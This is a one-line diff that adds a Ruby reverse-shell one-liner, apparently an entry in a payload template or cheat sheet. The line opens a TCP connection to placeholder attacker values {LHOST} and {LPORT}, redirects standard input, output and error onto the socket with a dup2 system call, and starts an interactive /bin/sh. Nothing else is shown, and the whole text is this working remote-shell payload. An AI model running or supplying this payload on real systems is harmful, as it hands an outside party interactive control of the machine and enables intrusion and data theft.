@@ -1,0 +1,1 @@
+ruby -rsocket -e 'f=TCPSocket.open("{LHOST}",{LPORT});[0,1,2].each{|fd| syscall(33,f.fileno,fd)};exec("/bin/sh -i")'
